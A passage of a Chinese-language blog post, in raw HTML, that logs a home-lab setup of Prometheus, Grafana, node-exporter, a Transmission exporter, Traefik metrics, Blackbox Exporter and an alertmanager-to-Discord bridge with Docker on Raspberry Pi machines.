class=\"line\"><span class=\"attr\">    image:</span>  <span class=\"string\">quay.io/prometheus/node-exporter:latest</span> <span class=\"comment\">#prom/node-exporter:v0.18.0</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">node-exporter</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/proc:/host/proc:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/sys:/host/sys:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/:/rootfs:ro</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--path.procfs=/host/proc'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--path.sysfs=/host/sys'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"bullet\">--collector.filesystem.ignored-mount-points</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)\"</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">monitoring</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'9100'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  grafana:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">grafana/grafana:7.5.2</span></span><br><span class=\"line\"><span class=\"attr\">    user:</span> <span class=\"string\">\"104\"</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">grafana</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"attr\">      - grafana_data:</span><span class=\"string\">/var/lib/grafana</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">$PWD/grafana/provisioning/:/etc/grafana/provisioning/</span></span><br><span class=\"line\"><span class=\"attr\">    env_file:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">$PWD/grafana/config.monitoring</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">monitoring</span></span><br><span class=\"line\"><span class=\"attr\">    links:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">prometheus</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">3000</span><span class=\"string\">:3000</span></span><br><span class=\"line\"><span class=\"attr\">    depends_on:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">prometheus</span></span><br></pre></td></tr></table></figure>\n<p>接下來設定在 Grafana 設定 Promethus Datasource 設定<br>就完成了</p>\n<p>相關 alertmanager 調整請看 15分鐘建製 Promethus 環境</p>\n<h2 id=\"Node-Exporter\"><a href=\"#Node-Exporter\" class=\"headerlink\" title=\"Node Exporter\"></a>Node Exporter</h2><p>我原本以為 Node Exporter 要抓本機機器一定要用 Systemd 去執行程式<br>但看範例是用 Docker<br>感覺不一定要用 Systemd</p>\n<p>這邊我機器都有安裝 Docker<br>所以我就沒選則用這個方式</p>\n<p>使用 Systemd 方式記錄一下<br>可參考</p>\n<ol>\n<li><a href=\"https://www.jianshu.com/p/7bec152d1a1f\" target=\"_blank\" rel=\"noopener\">node_exporter 配置 - 简书</a></li>\n<li><a href=\"https://gist.github.com/jarek-przygodzki/735e15337a3502fea40beba27e193b04\" target=\"_blank\" rel=\"noopener\">Installing node_exporter as systemd serivice · GitHub</a></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo tee /etc/systemd/system/node_exporter.service &lt;&lt;&quot;EOF&quot;</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Node Exporter</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=node_exporter</span><br><span class=\"line\">Group=node_exporter</span><br><span class=\"line\">EnvironmentFile=-/etc/sysconfig/node_exporter</span><br><span class=\"line\">ExecStart=/usr/local/bin/node_exporter $OPTIONS</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p>docker 要怎麼用呢?<br>其實上面就寫了</p>\n<p>官方寫法跟我的有點不太一樣</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d \\</span><br><span class=\"line\">  --net=<span class=\"string\">\"host\"</span> \\</span><br><span class=\"line\">  --pid=<span class=\"string\">\"host\"</span> \\</span><br><span class=\"line\">  -v <span class=\"string\">\"/:/host:ro,rslave\"</span> \\</span><br><span class=\"line\">  quay.io/prometheus/node-exporter:latest \\</span><br><span class=\"line\">  --path.rootfs=/host</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3.8'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  node_exporter:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">quay.io/prometheus/node-exporter:latest</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">node_exporter</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--path.rootfs=/host'</span></span><br><span class=\"line\"><span class=\"attr\">    network_mode:</span> <span class=\"string\">host</span></span><br><span class=\"line\"><span class=\"attr\">    pid:</span> <span class=\"string\">host</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">unless-stopped</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'/:/host:ro,rslave'</span></span><br></pre></td></tr></table></figure>\n<p>這邊不太明白 network_mode 要用 host 模式?</p>\n<p>最我我選擇調整別台使用 docker</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3.8'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  node_exporter:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span>  <span class=\"string\">quay.io/prometheus/node-exporter:latest</span> </span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">node-exporter</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/proc:/host/proc:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/sys:/host/sys:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/:/rootfs:ro</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--path.procfs=/host/proc'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--path.sysfs=/host/sys'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"bullet\">--collector.filesystem.ignored-mount-points</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)\"</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'9100'</span></span><br></pre></td></tr></table></figure>\n<p>dockr-compose up 起來</p>\n<p>prometheus/config.yml 修改<br><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">- job_name:</span> <span class=\"string\">'node-exporter'</span></span><br><span class=\"line\">  <span class=\"comment\"># Override the global default and scrape targets from this job every 5 seconds.</span></span><br><span class=\"line\">  <span class=\"comment\"># metrics_path defaults to '/metrics'</span></span><br><span class=\"line\">  <span class=\"comment\"># scheme defaults to 'http'.</span></span><br><span class=\"line\"><span class=\"attr\">  scrape_interval:</span> <span class=\"number\">5</span><span class=\"string\">s</span></span><br><span class=\"line\"><span class=\"attr\">  static_configs:</span></span><br><span class=\"line\"><span class=\"attr\">    - targets:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'node_exporter:9100'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'192.168.1.xx:9100'</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'192.168.1.xx:9100'</span></span><br></pre></td></tr></table></figure></p>\n<p>有遇到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ERROR: Version in &quot;./docker-compose.yml&quot; is unsupported. You might be seeing this error because you&apos;re using the wrong Compose file version. Either specify a supported version (e.g &quot;2.2&quot; or &quot;3.3&quot;) and place your service definitions under the `services` key, or omit the `version` key and place your service definitions at the root of the file to use version 1.</span><br><span class=\"line\">For more on the Compose file format versions, see https://docs.docker.com/compose/compose-file/</span><br></pre></td></tr></table></figure>\n<p>請更新 docker-compose version</p>\n<p>armv6 (pi 1 ) 不能跑<br>自己找網路上 build 都失敗<br>仔細想想，真的 PI 效能真的很低<br>所以就不放這個了</p>\n<p><a href=\"https://grafana.com/grafana/dashboards/8919\" target=\"_blank\" rel=\"noopener\">1 Node Exporter for Prometheus Dashboard CN v20201010 dashboard for Grafana | Grafana Labs</a><br><a href=\"https://grafana.com/grafana/dashboards/1860\" target=\"_blank\" rel=\"noopener\">Node Exporter Full dashboard for Grafana | Grafana Labs</a></p>\n<h2 id=\"tranmission\"><a href=\"#tranmission\" class=\"headerlink\" title=\"tranmission\"></a>tranmission</h2><ul>\n<li><a href=\"https://github.com/sandrotosi/simple-transmission-exporter\" target=\"_blank\" rel=\"noopener\">GitHub - sandrotosi/simple-transmission-exporter: A simple Prometheus exporter for Transmission</a></li>\n<li><a href=\"https://github.com/metalmatze/transmission-exporter\" target=\"_blank\" rel=\"noopener\">GitHub - metalmatze/transmission-exporter: Prometheus exporter for Transmission metrics, written in Go.</a></li>\n</ul>\n<p>仔細看了一下 dashboard<br>兩個差異還滿大的<br>主要我是要看網路傳輸速度<br>所以我這邊選擇 python 版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/sandrotosi/simple-transmission-exporter.git</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改 Dockerfile 為 arm32v7</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> arm32v7/python:<span class=\"number\">3.9</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build -t transmission_exporter .</span><br><span class=\"line\"></span><br><span class=\"line\">docker run -e TRANSMISSION_HOST=192.168.x.x \\</span><br><span class=\"line\">           -e TRANSMISSION_PORT=9091 \\</span><br><span class=\"line\">           -e TRANSMISSION_USERNAME=admin \\</span><br><span class=\"line\">           -e TRANSMISSION_PASSWORD=xxx \\</span><br><span class=\"line\">           -d -p 29091:29091 transmission_exporter</span><br></pre></td></tr></table></figure>\n<p>prometheus 設定增加後，重啟服務<code>docker-compose restart prometheus</code><br><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">- job_name:</span> <span class=\"string\">'transmission-exporter'</span> </span><br><span class=\"line\">  <span class=\"comment\"># Override the global default and scrape targets from this job every 5 seconds.</span></span><br><span class=\"line\">  <span class=\"comment\"># metrics_path defaults to '/metrics'</span></span><br><span class=\"line\">  <span class=\"comment\"># scheme defaults to 'http'.</span></span><br><span class=\"line\"><span class=\"attr\">  static_configs:</span></span><br><span class=\"line\"><span class=\"attr\">    - targets:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'192.168.1.203:29091'</span></span><br></pre></td></tr></table></figure></p>\n<p>調整成 docker-compose<br>換成 docker-compose 就不能運作了…<br>但一般docker 指令可正常執行…<br>真的很奇怪</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">version: &apos;2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  transmission_exporter:</span><br><span class=\"line\">    build:</span><br><span class=\"line\">      context: .</span><br><span class=\"line\">      dockerfile: Dockerfile</span><br><span class=\"line\">    image: transmission_exporter</span><br><span class=\"line\">    container_name: transmission_exporter</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">     - &quot;29091:29091&quot;</span><br><span class=\"line\">    environment:</span><br><span class=\"line\">      - &quot;TRANSMISSION_HOST=192.168.1.203&quot;</span><br><span class=\"line\">      - &quot;TRANSMISSION_PORT=9091&quot;</span><br><span class=\"line\">      - &quot;TRANSMISSION_USERNAME=admin&quot;</span><br><span class=\"line\">      - &quot;TRANSMISSION_PASSWORD=admin&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>20210408</strong><br>後來發現 docker-compose up 起來 IP 好像不一樣<br>所以才不能跑</p>\n<p>看 transmission 設定有一個設定白名單</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">\"rpc-whitelist\": \"127.0.0.1,192.168.1.*,172.17.0.*\",</span><br><span class=\"line\">\"rpc-whitelist-enabled\": true,</span><br></pre></td></tr></table></figure>\n<p>172.17.0.* 預設會過<br>但是 docker-compose 起來不是這段 IP</p>\n<p><a href=\"https://titangene.github.io/article/networking-in-docker-compose.html\" target=\"_blank\" rel=\"noopener\">透過 Docker Compose 設定 network | Titangene Blog</a></p>\n<p>目前指令不先研究怎麼使用<br>最快方法就是把IP調成<code>172.*.*.*</code></p>\n<h2 id=\"traefik\"><a href=\"#traefik\" class=\"headerlink\" title=\"traefik\"></a>traefik</h2><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">command:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"--api.insecure=true\"</span></span><br><span class=\"line\">  <span class=\"string\">....(省略)</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"--accesslog=true\"</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"--metrics.prometheus=true\"</span></span><br></pre></td></tr></table></figure>\n<p>原生 traefik 就有支援 prometheus<br>加上這個<code>--metrics.prometheus=true</code>就能使用</p>\n<p>granafan 加表<a href=\"https://grafana.com/grafana/dashboards/4475\" target=\"_blank\" rel=\"noopener\">Traefik dashboard for Grafana | Grafana Labs</a>會看到<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Panel plugin not found: grafana-piechart-panel</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/vegasbrianc/docker-traefik-prometheus/blob/master/grafana/config.monitoring\" target=\"_blank\" rel=\"noopener\">docker-traefik-prometheus/config.monitoring at master · vegasbrianc/docker-traefik-prometheus · GitHub</a><br>這邊有看到跑 docker 前<br>可以在這邊設定這個<br>這樣可以忽略下面安裝 plugin</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@prometheus prometheus]<span class=\"comment\"># grafana-cli plugins install grafana-piechart-panel</span></span><br><span class=\"line\"></span><br><span class=\"line\">installing grafana-piechart-panel @ 1.6.1</span><br><span class=\"line\"></span><br><span class=\"line\">from: https://grafana.com/api/plugins/grafana-piechart-panel/versions/1.6.1/download</span><br><span class=\"line\"></span><br><span class=\"line\">into: /var/lib/grafana/plugins</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">✔ Installed grafana-piechart-panel successfully </span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">Restart grafana after installing plugins . &lt;service grafana-server restart&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">[root@prometheus prometheus]<span class=\"comment\"># systemctl restart grafana-server.service</span></span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://lian.st/4077.html\" target=\"_blank\" rel=\"noopener\">解决Panel plugin not found: grafana-piechart-panel - 知我知行</a></p>\n<p>但我這邊是用docker<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose exec grafana bash</span><br><span class=\"line\">grafana-cli plugins install grafana-piechart-panel</span><br></pre></td></tr></table></figure></p>\n<p>我後來是用這個 dashboard<br><a href=\"https://grafana.com/grafana/dashboards/12250\" target=\"_blank\" rel=\"noopener\">Traefik 2.2 dashboard for Grafana | Grafana Labs</a></p>\n<p>後來發我現<a href=\"https://github.com/vegasbrianc/docker-traefik-prometheus/blob/master/grafana/config.monitoring\" target=\"_blank\" rel=\"noopener\">docker-traefik-prometheus/config.monitoring at master · vegasbrianc/docker-traefik-prometheus · GitHub</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">GF_INSTALL_PLUGINS=grafana-piechart-panel</span><br></pre></td></tr></table></figure>\n<h2 id=\"process-exporter\"><a href=\"#process-exporter\" class=\"headerlink\" title=\"process exporter\"></a>process exporter</h2><p>目前沒用到<br>是看程式有沒有執行<br>但目前相對程式都有 exporter<br>就沒有使用</p>\n<p><a href=\"https://www.cnblogs.com/huandada/p/10431667.html\" target=\"_blank\" rel=\"noopener\">Prometheus — Process-exporter进程监控 - huandada - 博客园</a></p>\n<h2 id=\"Blackbox-Exporter\"><a href=\"#Blackbox-Exporter\" class=\"headerlink\" title=\"Blackbox Exporter\"></a>Blackbox Exporter</h2><p>老實說，剛看好難入手<br>實作完才知道大概在做什麼</p>\n<p>簡單來說，所有控制點都在 prometheus<br>blackbox 都是收到接收做事情簡查</p>\n<p>不多說，馬上實作<br>先<code>git clone https://github.com/prometheus/blackbox_exporter.git</code>下來</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm -d -p 9115:9115 --name blackbox_exporter -v `<span class=\"built_in\">pwd</span>`:/config prom/blackbox-exporter:master --config.file=/config/blackbox.yml</span><br></pre></td></tr></table></figure>\n<p>prometheus 設定<br><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">- job_name:</span> <span class=\"string\">'blackbox'</span></span><br><span class=\"line\"><span class=\"attr\">  metrics_path:</span> <span class=\"string\">/probe</span></span><br><span class=\"line\"><span class=\"attr\">  params:</span></span><br><span class=\"line\"><span class=\"attr\">    module:</span> <span class=\"string\">[http_2xx]</span>  <span class=\"comment\"># Look for a HTTP 200 response.</span></span><br><span class=\"line\"><span class=\"attr\">  static_configs:</span></span><br><span class=\"line\"><span class=\"attr\">    - targets:</span></span><br><span class=\"line\"><span class=\"attr\">      - https:</span><span class=\"string\">//xxx.web</span>   <span class=\"comment\"># Target to probe with https.</span></span><br><span class=\"line\"><span class=\"attr\">  relabel_configs:</span></span><br><span class=\"line\"><span class=\"attr\">    - source_labels:</span> <span class=\"string\">[__address__]</span></span><br><span class=\"line\"><span class=\"attr\">      target_label:</span> <span class=\"string\">__param_target</span></span><br><span class=\"line\"><span class=\"attr\">    - source_labels:</span> <span class=\"string\">[__param_target]</span></span><br><span class=\"line\"><span class=\"attr\">      target_label:</span> <span class=\"string\">instance</span></span><br><span class=\"line\"><span class=\"attr\">    - target_label:</span> <span class=\"string\">__address__</span></span><br><span class=\"line\"><span class=\"attr\">      replacement:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span><span class=\"string\">:9115</span>  <span class=\"comment\"># The blackbox exporter's real hostname:port.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">- job_name:</span> <span class=\"string\">blackbox-ping</span></span><br><span class=\"line\"><span class=\"attr\">  metrics_path:</span> <span class=\"string\">/probe</span></span><br><span class=\"line\"><span class=\"attr\">  params:</span></span><br><span class=\"line\"><span class=\"attr\">    module:</span> <span class=\"string\">[icmp]</span></span><br><span class=\"line\"><span class=\"attr\">  static_configs:</span></span><br><span class=\"line\"><span class=\"attr\">    - targets:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"string\">.xx</span>   <span class=\"comment\"># &lt;== Put here your targets</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"string\">.xx</span>   <span class=\"comment\"># &lt;== Put here your targets</span></span><br><span class=\"line\"><span class=\"attr\">  relabel_configs:</span>    <span class=\"comment\"># &lt;== This comes from the blackbox exporter README</span></span><br><span class=\"line\"><span class=\"attr\">    - source_labels:</span> <span class=\"string\">[__address__]</span></span><br><span class=\"line\"><span class=\"attr\">      target_label:</span> <span class=\"string\">__param_target</span></span><br><span class=\"line\"><span class=\"attr\">    - source_labels:</span> <span class=\"string\">[__param_target]</span></span><br><span class=\"line\"><span class=\"attr\">      target_label:</span> <span class=\"string\">instance</span></span><br><span class=\"line\"><span class=\"attr\">    - target_label:</span> <span class=\"string\">__address__</span></span><br><span class=\"line\"><span class=\"attr\">      replacement:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span><span class=\"string\">:9115</span> <span class=\"comment\"># Blackbox exporter.</span></span><br></pre></td></tr></table></figure></p>\n<p>接下來重啟 <code>dokcer-compose restart prometheus</code><br>就能解決了</p>\n<p>調整為 docker-compose </p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3.3'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  blackbox_exporter:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">prom/blackbox-exporter:master</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">blackbox_exporter</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">$PWD:/config</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'--config.file=/config/blackbox.yml'</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'9115'</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">9115</span><span class=\"string\">:9115</span></span><br></pre></td></tr></table></figure>\n<p>參考:<br><a href=\"https://stackoverflow.com/questions/55526487/how-to-ping-targets-using-blackbox-exporter-with-prometheus\" target=\"_blank\" rel=\"noopener\">How to ping targets using blackbox_exporter with prometheus - Stack Overflow</a></p>\n<p><a href=\"https://william-yeh.net/post/2020/08/blackbox-exporter/\" target=\"_blank\" rel=\"noopener\">Blackbox Exporter 小記 - Potioneer’s Essays</a><br><a href=\"https://yunlzheng.gitbook.io/prometheus-book/part-ii-prometheus-jin-jie/exporter/commonly-eporter-usage/install_blackbox_exporter\" target=\"_blank\" rel=\"noopener\">网络探测：Blackbox Exporter - prometheus-book</a></p>\n<p><a href=\"https://www.cnblogs.com/fsckzy/p/14172262.html\" target=\"_blank\" rel=\"noopener\">grafana 7 监控https证书过期时间 - 海口-熟练工 - 博客园</a></p>\n<h2 id=\"官方-exporter-清單\"><a href=\"#官方-exporter-清單\" class=\"headerlink\" title=\"官方 exporter 清單\"></a>官方 exporter 清單</h2><p><a href=\"https://prometheus.io/docs/instrumenting/exporters/\" target=\"_blank\" rel=\"noopener\">Exporters and integrations | Prometheus</a></p>\n<h2 id=\"安裝-alertmanager-discord\"><a href=\"#安裝-alertmanager-discord\" class=\"headerlink\" title=\"安裝 alertmanager-discord\"></a>安裝 alertmanager-discord</h2><p>首先 git clone 下來改 arm32v7 映像檔<br>golang build 參數調整<br>再 build 看看有沒有問題</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/benjojo/alertmanager-discord.git</span><br></pre></td></tr></table></figure>\n<p>Dockerfile build 調整如下<br>中間有遇到一些狀況</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Built following https://medium.com/@chemidy/create-the-smallest-and-secured-golang-docker-image-based-on-scratch                                                           -4752223b7324</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># STEP 1 build executable binary</span></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> arm32v7/golang as builder</span><br><span class=\"line\"><span class=\"comment\"># Install SSL ca certificates</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt update</span></span><br><span class=\"line\"><span class=\"bash\">RUN apt install git</span></span><br><span class=\"line\"><span class=\"bash\">RUN apt install  ca-certificates</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># Create appuser</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN adduser appuser</span></span><br><span class=\"line\"><span class=\"bash\">COPY . <span class=\"variable\">$GOPATH</span>/src/mypackage/myapp/</span></span><br><span class=\"line\"><span class=\"bash\">WORKDIR <span class=\"variable\">$GOPATH</span>/src/mypackage/myapp/</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\">#get dependancies</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN go get -d -v</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\">#build the binary</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -a -installsuffix cgo -ldflags=<span class=\"string\">\"-w -s\"</span> -o /go/bin/alertma                                                           nager-discord</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># STEP 2 build a small image</span></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># start from scratch</span></span></span><br><span class=\"line\"><span class=\"bash\">FROM hypriot/rpi-alpine-scratch</span></span><br><span class=\"line\"><span class=\"bash\">COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/</span></span><br><span class=\"line\"><span class=\"bash\">COPY --from=builder /etc/passwd /etc/passwd</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># Copy our static executable</span></span></span><br><span class=\"line\"><span class=\"bash\">COPY --from=builder /go/bin/alertmanager-discord /go/bin/alertmanager-discord</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">ENV LISTEN_ADDRESS=0.0.0.0:9094</span></span><br><span class=\"line\"><span class=\"bash\">EXPOSE 9094</span></span><br><span class=\"line\"><span class=\"bash\">USER appuser</span></span><br><span class=\"line\"><span class=\"bash\">ENTRYPOINT [<span class=\"string\">\"/go/bin/alertmanager-discord\"</span>]</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build -t alertmanager-discord .</span><br></pre></td></tr></table></figure>\n<p>完成，之前我寫的 line 測試的 curl 用在這個會失敗<br>直接設定到 alertmanager 測試正常</p>\n<p>直接docker run 跑起來吧</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm -d -e DISCORD_WEBHOOK=https://discord.com/api/webhooks/xxxxxxx -p 9094:9094 alertmanager-discord</span><br></pre></td></tr></table></figure>\n<p>alertmanager/config.yml<br><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">route:</span></span><br><span class=\"line\"><span class=\"attr\">  group_by:</span> <span class=\"string\">['alertname']</span></span><br><span class=\"line\"><span class=\"attr\">  group_wait:</span> <span class=\"number\">10</span><span class=\"string\">s</span></span><br><span class=\"line\"><span 